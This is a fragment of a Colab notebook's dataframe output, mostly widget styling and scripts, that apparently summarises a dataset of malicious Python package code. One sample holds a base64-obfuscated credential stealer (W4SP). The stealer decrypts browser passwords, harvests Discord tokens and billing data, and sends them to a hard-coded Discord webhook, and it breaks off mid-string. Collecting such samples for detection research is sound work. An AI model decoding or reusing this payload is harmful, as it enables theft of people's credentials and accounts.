              "      cursor: pointer;\n",
              "      display: none;\n",
              "      fill: #1967D2;\n",
              "      height: 32px;\n",
              "      padding: 0 0 0 0;\n",
              "      width: 32px;\n",
              "    }\n",
              "\n",
              "    .colab-df-convert:hover {\n",
              "      background-color: #E2EBFA;\n",
              "      box-shadow: 0px 1px 2px rgba(60, 64, 67, 0.3), 0px 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "      fill: #174EA6;\n",
              "    }\n",
              "\n",
              "    .colab-df-buttons div {\n",
              "      margin-bottom: 4px;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert {\n",
              "      background-color: #3B4455;\n",
              "      fill: #D2E3FC;\n",
              "    }\n",
              "\n",
              "    [theme=dark] .colab-df-convert:hover {\n",
              "      background-color: #434B5C;\n",
              "      box-shadow: 0px 1px 3px 1px rgba(0, 0, 0, 0.15);\n",
              "      filter: drop-shadow(0px 1px 2px rgba(0, 0, 0, 0.3));\n",
              "      fill: #FFFFFF;\n",
              "    }\n",
              "  </style>\n",
              "\n",
              "    <script>\n",
              "      const buttonEl =\n",
              "        document.querySelector('#df-2e9f1fd3-f77a-4925-b459-b4df43825c8a button.colab-df-convert');\n",
              "      buttonEl.style.display =\n",
              "        google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "\n",
              "      async function convertToInteractive(key) {\n",
              "        const element = document.querySelector('#df-2e9f1fd3-f77a-4925-b459-b4df43825c8a');\n",
              "        const dataTable =\n",
              "          await google.colab.kernel.invokeFunction('convertToInteractive',\n",
              "                                                    [key], {});\n",
              "        if (!dataTable) return;\n",
              "\n",
              "        const docLinkHtml = 'Like what you see? Visit the ' +\n",
              "          '<a target=\"_blank\" href=https://colab.research.google.com/notebooks/data_table.ipynb>data table notebook</a>'\n",
              "          + ' to learn more about interactive tables.';\n",
              "        element.innerHTML = '';\n",
              "        dataTable['output_type'] = 'display_data';\n",
              "        await google.colab.output.renderOutput(dataTable, element);\n",
              "        const docLink = document.createElement('div');\n",
              "        docLink.innerHTML = docLinkHtml;\n",
              "        element.appendChild(docLink);\n",
              "      }\n",
              "    </script>\n",
              "  </div>\n",
              "\n",
              "\n",
              "    <div id=\"df-24d612af-7361-4e27-911e-9df31babac2e\">\n",
              "      <button class=\"colab-df-quickchart\" onclick=\"quickchart('df-24d612af-7361-4e27-911e-9df31babac2e')\"\n",
              "                title=\"Suggest charts\"\n",
              "                style=\"display:none;\">\n",
              "\n",
              "<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"24px\"viewBox=\"0 0 24 24\"\n",
              "     width=\"24px\">\n",
              "    <g>\n",
              "        <path d=\"M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zM9 17H7v-7h2v7zm4 0h-2V7h2v10zm4 0h-2v-4h2v4z\"/>\n",
              "    </g>\n",
              "</svg>\n",
              "      </button>\n",
              "\n",
              "<style>\n",
              "  .colab-df-quickchart {\n",
              "      --bg-color: #E8F0FE;\n",
              "      --fill-color: #1967D2;\n",
              "      --hover-bg-color: #E2EBFA;\n",
              "      --hover-fill-color: #174EA6;\n",
              "      --disabled-fill-color: #AAA;\n",
              "      --disabled-bg-color: #DDD;\n",
              "  }\n",
              "\n",
              "  [theme=dark] .colab-df-quickchart {\n",
              "      --bg-color: #3B4455;\n",
              "      --fill-color: #D2E3FC;\n",
              "      --hover-bg-color: #434B5C;\n",
              "      --hover-fill-color: #FFFFFF;\n",
              "      --disabled-bg-color: #3B4455;\n",
              "      --disabled-fill-color: #666;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart {\n",
              "    background-color: var(--bg-color);\n",
              "    border: none;\n",
              "    border-radius: 50%;\n",
              "    cursor: pointer;\n",
              "    display: none;\n",
              "    fill: var(--fill-color);\n",
              "    height: 32px;\n",
              "    padding: 0;\n",
              "    width: 32px;\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart:hover {\n",
              "    background-color: var(--hover-bg-color);\n",
              "    box-shadow: 0 1px 2px rgba(60, 64, 67, 0.3), 0 1px 3px 1px rgba(60, 64, 67, 0.15);\n",
              "    fill: var(--button-hover-fill-color);\n",
              "  }\n",
              "\n",
              "  .colab-df-quickchart-complete:disabled,\n",
              "  .colab-df-quickchart-complete:disabled:hover {\n",
              "    background-color: var(--disabled-bg-color);\n",
              "    fill: var(--disabled-fill-color);\n",
              "    box-shadow: none;\n",
              "  }\n",
              "\n",
              "  .colab-df-spinner {\n",
              "    border: 2px solid var(--fill-color);\n",
              "    border-color: transparent;\n",
              "    border-bottom-color: var(--fill-color);\n",
              "    animation:\n",
              "      spin 1s steps(1) infinite;\n",
              "  }\n",
              "\n",
              "  @keyframes spin {\n",
              "    0% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "      border-left-color: var(--fill-color);\n",
              "    }\n",
              "    20% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    30% {\n",
              "      border-color: transparent;\n",
              "      border-left-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    40% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-top-color: var(--fill-color);\n",
              "    }\n",
              "    60% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "    }\n",
              "    80% {\n",
              "      border-color: transparent;\n",
              "      border-right-color: var(--fill-color);\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "    90% {\n",
              "      border-color: transparent;\n",
              "      border-bottom-color: var(--fill-color);\n",
              "    }\n",
              "  }\n",
              "</style>\n",
              "\n",
              "      <script>\n",
              "        async function quickchart(key) {\n",
              "          const quickchartButtonEl =\n",
              "            document.querySelector('#' + key + ' button');\n",
              "          quickchartButtonEl.disabled = true;  // To prevent multiple clicks.\n",
              "          quickchartButtonEl.classList.add('colab-df-spinner');\n",
              "          try {\n",
              "            const charts = await google.colab.kernel.invokeFunction(\n",
              "                'suggestCharts', [key], {});\n",
              "          } catch (error) {\n",
              "            console.error('Error during call to suggestCharts:', error);\n",
              "          }\n",
              "          quickchartButtonEl.classList.remove('colab-df-spinner');\n",
              "          quickchartButtonEl.classList.add('colab-df-quickchart-complete');\n",
              "        }\n",
              "        (() => {\n",
              "          let quickchartButtonEl =\n",
              "            document.querySelector('#df-24d612af-7361-4e27-911e-9df31babac2e button');\n",
              "          quickchartButtonEl.style.display =\n",
              "            google.colab.kernel.accessAllowed ? 'block' : 'none';\n",
              "        })();\n",
              "      </script>\n",
              "    </div>\n",
              "\n",
              "    </div>\n",
              "  </div>\n"
            ],
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "dataframe",
              "summary": "{\n  \"name\": \"    print(f\\\"\\ud30c\\uc77c \\ub85c\\ub4dc \\uc911 \\uc624\\ub958\\uac00 \\ubc1c\\uc0dd\\ud588\\uc2b5\\ub2c8\\ub2e4: {e}\\\")\",\n  \"rows\": 5,\n  \"fields\": [\n    {\n      \"column\": \"package\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 5,\n        \"samples\": [\n          \"pypackscraper\",\n          \"pxz\",\n          \"markdown\"\n        ],\n        \"semantic_type\": \"\",\n        \"description\": \"\"\n      }\n    },\n    {\n      \"column\": \"code\",\n      \"properties\": {\n        \"dtype\": \"string\",\n        \"num_unique_values\": 5,\n        \"samples\": [\n          \"\\n \\n\\nimport base64, codecs\\nmagic = 'aW1wb3J0IG9zCmltcG9ydCB0aHJlYWRpbmcKZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUKZnJvbSBzcWxpdGUzIGltcG9ydCBjb25uZWN0IGFzIHNxbF9jb25uZWN0CmltcG9ydCByZQpmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlCmZyb20ganNvbiBpbXBvcnQgbG9hZHMgYXMganNvbl9sb2FkcywgbG9hZApmcm9tIGN0eXBlcyBpbXBvcnQgd2luZGxsLCB3aW50eXBlcywgYnlyZWYsIGNkbGwsIFN0cnVjdHVyZSwgUE9JTlRFUiwgY19jaGFyLCBjX2J1ZmZlcgpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuCmZyb20ganNvbiBpbXBvcnQgbG9hZHMsIGR1bXBzCmltcG9ydCB0aW1lCmltcG9ydCBzaHV0aWwKZnJvbSB6aXBmaWxlIGltcG9ydCBaaXBGaWxlCmltcG9ydCByYW5kb20KaW1wb3J0IHJlCmltcG9ydCBzdWJwcm9jZXNzCgojICBUSElTIElTIDEuMS42IFZFUlNJT04KIyAgICBCWSBXNFNQLCBsb1R1czA0CiMgCgoKaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMDg4MDY2ODA5NTE4ODk5MjYxL0Q1c0JtU3JyWUpmcF93LS1qSEdsN1dtVElLeHV2ZVJxME1OTDlZU21fR0NqNFVCQjA4ekZhcE1yNnB0TzE2X2JBRmpZIgpERVRFQ1RFRCA9IEZhbHNlCgoKZGVmIGdldGlwKCk6CiAgICBpcCA9ICJOb25lIgogICAgdHJ5OgogICAgICAgIGlwID0gdXJsb3BlbihSZXF1ZXN0KCJodHRwczovL2FwaS5pcGlmeS5vcmciKSkucmVhZCgpLmRlY29kZSgpLnN0cmlwKCkKICAgIGV4Y2VwdDoKICAgICAgICBwYXNzCiAgICByZXR1cm4gaXAKCnJlcXVpcmVtZW50cyA9IFsKICAgIFsicmVxdWVzdHMiLCAicmVxdWVzdHMiXSwKICAgIFsiQ3J5cHRvLkNpcGhlciIsICJweWNyeXB0b2RvbWUiXQpdCmZvciBtb2RsIGluIHJlcXVpcmVtZW50czoKICAgIHRyeTogX19pbXBvcnRfXyhtb2RsWzBdKQogICAgZXhjZXB0OgogICAgICAgIHN1YnByb2Nlc3MuUG9wZW4oZiJ7ZXhlY3V0YWJsZX0gLW0gcGlwIGluc3RhbGwge21vZGxbMV19Iiwgc2hlbGw9VHJ1ZSkKICAgICAgICB0aW1lLnNsZWVwKDMpCgppbXBvcnQgcmVxdWVzdHMKZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMKCmxvY2FsID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpyb2FtaW5nID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKdGVtcCA9IG9zLmdldGVudigiVEVNUCIpClRocmVhZGxpc3QgPSBbXQoKCmNsYXNzIERBVEFfQkxPQihTdHJ1Y3R1cmUpOgogICAgX2ZpZWxkc18gPSBbCiAgICAgICAgKCdjYkRhdGEnLCB3aW50eXBlcy5EV09SRCksCiAgICAgICAgKCdwYkRhdGEnLCBQT0lOVEVSKGNfY2hhcikpCiAgICBdCgpkZWYgR2V0RGF0YShibG9iX291dCk6CiAgICBjYkRhdGEgPSBpbnQoYmxvYl9vdXQuY2JEYXRhKQogICAgcGJEYXRhID0gYmxvYl9vdXQucGJEYXRhCiAgICBidWZmZXIgPSBjX2J1ZmZlcihjYkRhdGEpCiAgICBjZGxsLm1zdmNydC5tZW1jcHkoYnVmZmVyLCBwYkRhdGEsIGNiRGF0YSkKICAgIHdpbmRsbC5rZXJuZWwzMi5Mb2NhbEZyZWUocGJEYXRhKQogICAgcmV0dXJuIGJ1ZmZlci5yYXcKCmRlZiBDcnlwdFVucHJvdGVjdERhdGEoZW5jcnlwdGVkX2J5dGVzLCBlbnRyb3B5PWInJyk6CiAgICBidWZmZXJfaW4gPSBjX2J1ZmZlcihlbmNyeXB0ZWRfYnl0ZXMsIGxlbihlbmNyeXB0ZWRfYnl0ZXMpKQogICAgYnVmZmVyX2VudHJvcHkgPSBjX2J1ZmZlcihlbnRyb3B5LCBsZW4oZW50cm9weSkpCiAgICBibG9iX2luID0gREFUQV9CTE9CKGxlbihlbmNyeXB0ZWRfYnl0ZXMpLCBidWZmZXJfaW4pCiAgICBibG9iX2VudHJvcHkgPSBEQVRBX0JMT0IobGVuKGVudHJvcHkpLCBidWZmZXJfZW50cm9weSkKICAgIGJsb2Jfb3V0ID0gREFUQV9CTE9CKCkKCiAgICBpZiB3aW5kbGwuY3J5cHQzMi5DcnlwdFVucHJvdGVjdERhdGEoYnlyZWYoYmxvYl9pbiksIE5vbmUsIGJ5cmVmKGJsb2JfZW50cm9weSksIE5vbmUsIE5vbmUsIDB4MDEsIGJ5cmVmKGJsb2Jfb3V0KSk6CiAgICAgICAgcmV0dXJuIEdldERhdGEoYmxvYl9vdXQpCgpkZWYgRGVjcnlwdFZhbHVlKGJ1ZmYsIG1hc3Rlcl9rZXk9Tm9uZSk6CiAgICBzdGFydHMgPSBidWZmLmRlY29kZShlbmNvZGluZz0ndXRmOCcsIGVycm9ycz0naWdub3JlJylbOjNdCiAgICBpZiBzdGFydHMgPT0gJ3YxMCcgb3Igc3RhcnRzID09ICd2MTEnOgogICAgICAgIGl2ID0gYnVmZlszOjE1XQogICAgICAgIHBheWxvYWQgPSBidWZmWzE1Ol0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KG1hc3Rlcl9rZXksIEFFUy5NT0RFX0dDTSwgaXYpCiAgICAgICAgZGVjcnlwdGVkX3Bhc3MgPSBjaXBoZXIuZGVjcnlwdChwYXlsb2FkKQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gZGVjcnlwdGVkX3Bhc3NbOi0xNl0uZGVjb2RlKCkKICAgICAgICByZXR1cm4gZGVjcnlwdGVkX3Bhc3MKCmRlZiBMb2FkUmVxdWVzdHMobWV0aG9kZSwgdXJsLCBkYXRhPScnLCBmaWxlcz0nJywgaGVhZGVycz0nJyk6CiAgICBmb3IgaSBpbiByYW5nZSg4KTogIyBtYXggdHJ5cwogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgbWV0aG9kZSA9PSAnUE9TVCc6CiAgICAgICAgICAgICAgICBpZiBkYXRhICE9ICcnOgogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1kYXRhKQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgICAgICAgICAgZWxpZiBmaWxlcyAhPSAnJzoKICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmwsIGZpbGVzPWZpbGVzKQogICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIG9yIHIuc3RhdHVzX2NvZGUgPT0gNDEzOiAjIDQxMyA9IERBVEEgVE8gQklHCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgpkZWYgTG9hZFVybGliKGhvb2ssIGRhdGE9JycsIGZpbGVzPScnLCBoZWFkZXJzPScnKToKICAgIGZvciBpIGluIHJhbmdlKDgpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgaGVhZGVycyAhPSAnJzoKICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhLCBoZWFkZXJzPWhlYWRlcnMpKQogICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHIgPSB1cmxvcGVuKFJlcXVlc3QoaG9vaywgZGF0YT1kYXRhKSkKICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgZXhjZXB0OiAKICAgICAgICAgICAgcGFzcwoKZGVmIGdsb2JhbEluZm8oKToKICAgIGlwID0gZ2V0aXAoKQogICAgdXNlcm5hbWUgPSBvcy5nZXRlbnYoIlVTRVJOQU1FIikKICAgIGlwZGF0YW5vanNvbiA9IHVybG9wZW4oUmVxdWVzdChmImh0dHBzOi8vZ2VvbG9jYXRpb24tZGIuY29tL2pzb25wL3tpcH0iKSkucmVhZCgpLmRlY29kZSgpLnJlcGxhY2UoJ2NhbGxiYWNrKCcsICcnKS5yZXBsYWNlKCd9KScsICd9JykKICAgICMgcHJpbnQoaXBkYXRhbm9qc29uKQogICAgaXBkYXRhID0gbG9hZHMoaXBkYXRhbm9qc29uKQogICAgIyBwcmludCh1cmxvcGVuKFJlcXVlc3QoZiJodHRwczovL2dlb2xvY2F0aW9uLWRiLmNvbS9qc29ucC97aXB9IikpLnJlYWQoKS5kZWNvZGUoKSkKICAgIGNvbnRyeSA9IGlwZGF0YVsiY291bnRyeV9uYW1lIl0KICAgIGNvbnRyeUNvZGUgPSBpcGRhdGFbImNvdW50cnlfY29kZSJdLmxvd2VyKCkKICAgIGdsb2JhbGluZm8gPSBmIjpmbGFnX3tjb250cnlDb2RlfTogIC0gYHt1c2VybmFtZS51cHBlcigpfSB8IHtpcH0gKHtjb250cnl9KWAiCiAgICAjIHByaW50KGdsb2JhbGluZm8pCiAgICByZXR1cm4gZ2xvYmFsaW5mbwoKCmRlZiBUcnVzdChDb29raWVzKToKICAgICMgc2ltcGxlIFRydXN0IEZhY3RvciBzeXN0ZW0gKGRpc2FibGVkIGZvciB0aGUgbW9tZW50KQogICAgZ2xvYmFsIERFVEVDVEVECiAgICBkYXRhID0gc3RyKENvb2tpZXMpCiAgICB0aW0gPSByZS5maW5kYWxsKCIuZ29vZ2xlLmNvbSIsIGRhdGEpCiAgICAjIHByaW50KGxlbih0aW0pKQogICAgaWYgbGVuKHRpbSkgPCAtMToKICAgICAgICBERVRFQ1RFRCA9IFRydWUKICAgICAgICByZXR1cm4gREVURUNURUQKICAgIGVsc2U6CiAgICAgICAgREVURUNURUQgPSBGYWxzZQogICAgICAgIHJldHVybiBERVRFQ1RFRAogICAgICAgIApkZWYgR2V0VUhRRnJpZW5kcyh0b2tlbik6CiAgICBiYWRnZUxpc3QgPSAgWwogICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwKICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8yJywgJ1ZhbHVlJzogMTYzODQsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8yOjg3NDc1MDgwODQzMDg3NDY2ND4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1N1cHBvcnRlcicsICdWYWx1ZSc6IDUxMiwgJ0Vtb2ppJzogIjw6ZWFybHlfc3VwcG9ydGVyOjg3NDc1MDgwODQxNDExMzgyMz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJpbGxpYW5jZScsICdWYWx1ZSc6IDEyOCwgJ0Vtb2ppJzogIjw6YnJpbGxpYW5jZTo4NzQ3NTA4MDgzMzg2MDgxOTk+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmF2ZXJ5JywgJ1ZhbHVlJzogNjQsICdFbW9qaSc6ICI8OmJyYXZlcnk6ODc0NzUwODA4Mzg4OTUyMDc1PiAifSwKICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSHlwZVNxdWFkX0V2ZW50cycsICdWYWx1ZSc6IDQsICdFbW9qaSc6ICI8Omh5cGVzcXVhZF9ldmVudHM6ODc0NzUwODA4NTk0NDc3MDU2PiAifSwKICAgICAgICB7Ik5hbWUiOiAnUGFydG5lcmVkX1NlcnZlcl9Pd25lcicsICdWYWx1ZSc6IDIsJ0Vtb2ppJzogIjw6cGFydG5lcjo4NzQ3NTA4MDg2NzgzNTQ5NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQogICAgXQogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CiAgICB0cnk6CiAgICAgICAgZnJpZW5kbGlzdCA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjYvdXNlcnMvQG1lL3JlbGF0aW9uc2hpcHMiLCBoZWFkZXJzPWhlYWRlcnMpKS5yZWFkKCkuZGVjb2RlKCkpCiAgICBleGNlcHQ6CiAgICAgICAgcmV0dXJuIEZhbHNlCgogICAgdWhxbGlzdCA9ICcnCiAgICBmb3IgZnJpZW5kIGluIGZyaWVuZGxpc3Q6CiAgICAgICAgT3duZWRCYWRnZXMgPSAnJwogICAgICAgIGZsYWdzID0gZnJpZW5kWyd1c2VyJ11bJ3B1YmxpY19mbGFncyddCiAgICAgICAgZm9yIGJhZGdlIGluIGJhZGdlTGlzdDoKICAgICAgICAgICAgaWYgZmxhZ3MgLy8gYmFkZ2VbIlZhbHVlIl0gIT0gMCBhbmQgZnJpZW5kWyd0eXBlJ10gPT0gMToKICAgICAgICAgICAgICAgIGlmIG5vdCAiSG91c2UiIGluIGJhZGdlWyJOYW1lIl06CiAgICAgICAgICAgICAgICAgICAgT3duZWRCYWRnZXMgKz0gYmFkZ2VbIkVtb2ppIl0KICAgICAgICAgICAgICAgIGZsYWdzID0gZmxhZ3MgJSBiYWRnZVsiVmFsdWUiXQogICAgICAgIGlmIE93bmVkQmFkZ2VzICE9ICcnOgogICAgICAgICAgICB1aHFsaXN0ICs9IGYie093bmVkQmFkZ2VzfSB8IHtmcmllbmRbJ3VzZXInXVsndXNlcm5hbWUnXX0je2ZyaWVuZFsndXNlciddWydkaXNjcmltaW5hdG9yJ119ICh7ZnJpZW5kWyd1c2VyJ11bJ2lkJ119KVxuIgogICAgcmV0dXJuIHVocWxpc3QKCgpkZWYgR2V0QmlsbGluZyh0b2tlbik6CiAgICBoZWFkZXJzID0gewogICAgICAgICJBdXRob3JpemF0aW9uIjogdG9rZW4sCiAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0OyBydjoxMDIuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDIuMCIKICAgIH0KICAgIHRyeToKICAgICAgICBiaWxsaW5nanNvbiA9IGxvYWRzKHVybG9wZW4oUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdXNlcnMvQG1lL2JpbGxpbmcvcGF5bWVudC1zb3VyY2VzIiwgaGVhZGVycz1oZWFkZXJzKSkucmVhZCgpLmRlY29kZSgpKQogICAgZXhjZXB0OgogICAgICAgIHJldHVybiBGYWxzZQogICAgCiAgICBpZiBiaWxsaW5nanNvbiA9PSBbXTogcmV0dXJuICIgLSIKCiAgICBiaWxsaW5nID0gIiIKICAgIGZvciBtZXRob2RlIGluIGJpbGxpbmdqc29uOgogICAgICAgIGlmIG1ldGhvZGVbImludmFsaWQiXSA9PSBGYWxzZToKICAgICAgICAgICAgaWYgbWV0aG9kZVsidHlwZSJdID09IDE6CiAgICAgICAgICAgICAgICBiaWxsaW5nICs9ICI6Y3JlZGl0X2NhcmQ6IgogICAgICAgICAgICBlbGlmIG1ldGhvZGVbInR5cGUiXSA9PSAyOgogICAgICAgICAgICAgICAgYmlsbGluZyArPSAiOnBhcmtpbmc6ICIKCiAgICByZXR1cm4gYmlsbGluZwoKCmRlZiBHZXRCYWRnZShmbGFncyk6CiAgICBpZiBmbGFncyA9PSAwOiByZXR1cm4gJycKCiAgICBPd25lZEJhZGdlcyA9ICcnCiAgICBiYWRnZUxpc3QgPSAgWwogICAgICAgIHsiTmFtZSI6ICdFYXJseV9WZXJpZmllZF9Cb3RfRGV2ZWxvcGVyJywgJ1ZhbHVlJzogMTMxMDcyLCAnRW1vamknOiAiPDpkZXZlbG9wZXI6ODc0NzUwODA4NDcyODI1OTg2PiAifSwKICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8yJywgJ1ZhbHVlJzogMTYzODQsICdFbW9qaSc6ICI8OmJ1Z2h1bnRlcl8yOjg3NDc1MDgwODQzMDg3NDY2ND4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0Vhcmx5X1N1cHBvcnRlcicsICdWYWx1ZSc6IDUxMiwgJ0Vtb2ppJzogIjw6ZWFybHlfc3VwcG9ydGVyOjg3NDc1MDgwODQxNDExMzgyMz4gIn0sCiAgICAgICAgeyJOYW1lIjogJ0hvdXNlX0JhbGFuY2UnLCAnVmFsdWUnOiAyNTYsICdFbW9qaSc6ICI8OmJhbGFuY2U6ODc0NzUwODA4MjY3MjkyNjgzPiAifSwKICAgICAgICB7Ik5hbWUiOiAnSG91c2VfQnJpbGxpYW5jZScsICdWYWx1ZSc6IDEyOCwgJ0Vtb2ppJzogIjw6YnJpbGxpYW5jZTo4NzQ3NTA4MDgzMzg2MDgxOTk+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdIb3VzZV9CcmF2ZXJ5JywgJ1ZhbHVlJzogNjQsICdFbW9qaSc6ICI8OmJyYXZlcnk6ODc0NzUwODA4Mzg4OTUyMDc1PiAifSwKICAgICAgICB7Ik5hbWUiOiAnQnVnX0h1bnRlcl9MZXZlbF8xJywgJ1ZhbHVlJzogOCwgJ0Vtb2ppJzogIjw6YnVnaHVudGVyXzE6ODc0NzUwODA4NDI2NjkyNjU4PiAifSwKICAgICAgICB7Ik5hbWUiOiAnSHlwZVNxdWFkX0V2ZW50cycsICdWYWx1ZSc6IDQsICdFbW9qaSc6ICI8Omh5cGVzcXVhZF9ldmVudHM6ODc0NzUwODA4NTk0NDc3MDU2PiAifSwKICAgICAgICB7Ik5hbWUiOiAnUGFydG5lcmVkX1NlcnZlcl9Pd25lcicsICdWYWx1ZSc6IDIsJ0Vtb2ppJzogIjw6cGFydG5lcjo4NzQ3NTA4MDg2NzgzNTQ5NjQ+ICJ9LAogICAgICAgIHsiTmFtZSI6ICdEaXNjb3JkX0VtcGxveWVlJywgJ1ZhbHVlJzogMSwgJ0Vtb2ppJzogIjw6c3RhZmY6ODc0NzUwODA4NzI4NjY2MTUyPiAifQogICAgXQogICAgZm9yIGJhZGdlIGluIGJhZGdlTGlzdDoKICAgICAgICBpZiBmbGFncyAvLyBiYWRnZVsiVmFsdWUiXSAhPSAwOgogICAgICAgICAgICBPd25lZEJhZGdlcyArPSBiYWRnZVsiRW1vamkiXQogICAgICAgICAgICBmbGFncyA9IGZsYWdzICUgYmFkZ2VbIlZhbHVlIl0KCiAgICByZXR1cm4gT3duZWRCYWRnZXMKCmRlZiBHZXRUb2tlbkluZm8odG9rZW4pOgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQXV0aG9yaXphdGlvbiI6IHRva2VuLAogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgdXNlcmpzb24gPSBsb2Fkcyh1cmxvcGVuKFJlcXVlc3QoImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3Y2L3VzZXJzL0BtZSIsIGhlYWRlcnM9aGVhZGVycykpLnJlYWQoKS5kZWNvZGUoKSkKICAgIHVzZXJuYW1lID0gdXNlcmpzb25bInVzZXJuYW1lIl0KICAgIGhhc2h0YWcgPSB1c2VyanNvblsiZGlzY3JpbWluYXRvciJdCiAgICBlbWFpbCA9IHVzZXJqc29uWyJlbWFpbCJdCiAgICBpZGQgPSB1c2VyanNvblsiaWQiXQogICAgcGZwID0gdXNlcmpzb25bImF2YXRhc'\\nlove = 